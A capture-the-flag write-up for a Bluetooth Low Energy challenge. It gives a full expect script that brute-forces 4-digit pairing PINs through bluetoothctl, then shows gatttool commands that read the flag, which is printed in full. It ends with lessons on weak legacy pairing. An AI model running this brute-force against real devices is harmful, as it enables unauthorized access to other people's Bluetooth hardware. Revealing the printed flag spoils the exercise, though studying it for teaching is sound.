# Writeup - Challenge 07: Weak Link

**Difficulty:** ⭐⭐⭐⭐ Advanced
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{pin_1234_is_not_a_password}`

---

## 🔍 Step 1: Connect and Observe the Pairing Requirement

```bash
bluetoothctl
[bluetooth]# scan on
# Note MAC: AA:BB:CC:DD:EE:FF
[bluetooth]# pair AA:BB:CC:DD:EE:FF
```

The device prompts for a PIN:
```
[agent] Enter passkey (number in 0-999999):
```

Try a common PIN like `0000`:
```
[agent] Enter passkey (number in 0-999999): 0000
Failed to pair: org.bluez.Error.AuthenticationFailed
```

---

## 🔓 Step 2: Automate the Brute-Force

Since manually trying 10,000 PINs is impractical, use `expect` to automate `bluetoothctl`:

```bash
#!/usr/bin/expect -f
# brute_force.expect

set mac "AA:BB:CC:DD:EE:FF"
set timeout 5

for {set pin 0} {$pin <= 9999} {incr pin} {
    set padded_pin [format "%04d" $pin]
    puts "Trying PIN: $padded_pin"

    spawn bluetoothctl
    expect "Agent registered"

    send "remove $mac\r"
    after 500

    send "pair $mac\r"
    expect "Enter passkey"

    send "$padded_pin\r"

    expect {
        "Pairing successful" {
            puts "\n\[+\] SUCCESS! PIN = $padded_pin"
            send "disconnect $mac\r"
            send "quit\r"
            exit 0
        }
        "AuthenticationFailed" {
            send "quit\r"
        }
        timeout {
            send "quit\r"
        }
    }
}
```

```bash
chmod +x brute_force.expect
./brute_force.expect
```

---

## 📖 Step 3: Read the Flag After Successful Pairing

Once paired with PIN `1234`:

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> char-read-uuid b1eb1eb1-0001-1000-8000-00805f9b34fb
```

Expected output:
```
handle: 0x0003   value: 57 4f 43 53 41 7b 70 69 6e 5f 31 32 33 34 5f 69 73 5f 6e 6f 74 5f 61 5f 70 61 73 73 77 6f 72 64 7d
```

Decode:
```
WOCSA{pin_1234_is_not_a_password}
```

---

## 🎯 Flag

```
WOCSA{pin_1234_is_not_a_password}
```

---

## Key Takeaways

* BLE **legacy pairing** with short numeric PINs is cryptographically weak — 4 digits means only 10,000 possibilities
* `ESP_IO_CAP_OUT` capability means the peripheral outputs the passkey (shown on serial), and the central (user) must type it — this enables scripted brute-forcing
* **BLE Security Modes:** Mode 1 Level 1 (no security), Level 2 (unauthenticated pairing), Level 3 (authenticated pairing with MITM protection), Level 4 (Secure Connections)
* PIN authentication without rate limiting or lockout is trivially bypassed — always use Secure Connections (LE Secure Connections) with longer random keys
